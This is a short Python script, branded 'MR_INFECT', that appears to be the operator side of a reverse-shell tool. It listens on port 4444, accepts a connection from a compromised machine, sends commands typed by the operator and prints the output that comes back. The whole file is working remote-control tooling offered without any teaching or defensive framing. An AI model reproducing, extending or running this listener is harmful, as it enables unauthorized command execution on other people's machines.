import socket
import pyfiglet

# Display ASCII art for MR_INFECT
ascii_banner = pyfiglet.figlet_format("MR_INFECT")
print(ascii_banner)

# Server configuration
SERVER_HOST = '0.0.0.0'  # Listen on all interfaces
SERVER_PORT = 4444

# Create a TCP socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the address and port
server_socket.bind((SERVER_HOST, SERVER_PORT))

# Listen for incoming connections
server_socket.listen(5)
print(f"[+] Listening on {SERVER_HOST}:{SERVER_PORT}...")

# Accept a connection from a client
client_socket, client_address = server_socket.accept()
print(f"[+] Connection established with {client_address}")

while True:
    # Take input from the server operator
    command = input(f"\033[1mMR_INFECT> \033[0m")

    if command.lower() == "exit":
        client_socket.send(command.encode())
        break

    # Send the command to the client
    client_socket.send(command.encode())

    # Receive the output from the client
    output = client_socket.recv(4096).decode()

    # Display the client output
    print(output)

# Close the connection
client_socket.close()
server_socket.close()

